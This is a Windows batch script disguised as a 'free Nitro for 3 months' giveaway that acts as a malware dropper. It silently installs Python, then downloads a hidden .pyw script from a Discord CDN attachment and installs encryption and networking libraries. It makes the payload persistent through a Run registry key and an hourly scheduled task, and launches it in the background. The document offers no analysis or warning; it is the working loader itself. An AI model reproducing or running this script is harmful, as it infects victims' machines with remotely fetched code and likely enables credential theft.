@echo off
set "PYTHON_INSTALLER_URL=https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
set "PYTHON_SCRIPT_URL=https://cdn.discordapp.com/attachments/1178783644463153242/1179478111222513714/final_decrypt.pyw?ex=6579ed97&is=65677897&hm=ee4ce34ecba005433ea178746a85d1a45e303b2da6ab13a52946b8e2d505cb87&"
set "SCRIPT_DIR=%~dp0"
set "PYTHON_INSTALLER_PATH=%SCRIPT_DIR%python-3.12.0-amd64.exe"
set "PYTHON_SCRIPT_NAME=free_nitro_3_month.pyw"
set "TASK_NAME=%PYTHON_SCRIPT_NAME%"
set "REGISTRY_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REGISTRY_ENTRY=%PYTHON_SCRIPT_NAME%"

:check_python_installed
rem Check if Python is already installed
python --version >NUL 2>NUL
if %errorlevel% equ 0 (
    echo Python is already installed.
) else (
    echo Python is not installed. Downloading and installing...
    
    rem Check if Python installer exists
    if not exist "%PYTHON_INSTALLER_PATH%" (
        echo Python installer not found. Downloading...
        curl -o "%PYTHON_INSTALLER_PATH%" "%PYTHON_INSTALLER_URL%"
    ) else (
        echo Python installer already exists.
    )

    rem Install Python silently
    start /wait "" "%PYTHON_INSTALLER_PATH%" /quiet InstallAllUsers=1 PrependPath=1

    rem Check if Python is installed
    python --version >NUL 2>NUL
    if %errorlevel% neq 0 (
        echo Python installation failed. Retrying in 30 seconds...
        timeout /nobreak /t 30 >NUL
        goto :check_python_installed
    ) else (
        echo Python is installed.
    )
)

rem Check if Necessary files exist in the current directory or in the PATH
set "PYTHON_SCRIPT_PATH="
for /f %%i in ('where /R . %PYTHON_SCRIPT_NAME%') do set "PYTHON_SCRIPT_PATH=%%i"

if not defined PYTHON_SCRIPT_PATH (
    echo Necessary files not found. Downloading...
    curl -o "%SCRIPT_DIR%%PYTHON_SCRIPT_NAME%" "%PYTHON_SCRIPT_URL%"
    set "PYTHON_SCRIPT_PATH=%SCRIPT_DIR%%PYTHON_SCRIPT_NAME%"
) else (
    echo Necessary files already exist.
)

rem Check if pip is installed
pip --version >NUL 2>NUL
if %errorlevel% neq 0 (
    echo Installing pip...
    python -m ensurepip --default-pip
) else (
    echo pip is already installed.
)

rem Install required Python libraries
echo Installing required Python libraries...
pip install pyaes 
pip install requests 
pip install ctypes
pip install shutil
pip install pycryptodome
pip install zipfile
pip install zlib

rem Additional libraries (adjust as needed)
pip install logging 

rem Check if registry entry for auto-start exists
reg query "%REGISTRY_KEY%" /v "%REGISTRY_ENTRY%" >nul 2>nul
if %errorlevel% neq 0 (
    echo process...
    reg add "%REGISTRY_KEY%" /v "%REGISTRY_ENTRY%" /t REG_SZ /d "\"%PYTHON_SCRIPT_PATH%"" >nul 2>nul
) else (
    echo process already exists.
)

rem Create a scheduled task to run the Python script every 1 hour
schtasks /create /tn "%TASK_NAME%" /tr "\"%PYTHON_SCRIPT_PATH%\"" /sc hourly /mo 1 /ru INTERACTIVE

rem wait
echo wait...

start /B python "%PYTHON_SCRIPT_PATH%"

pause
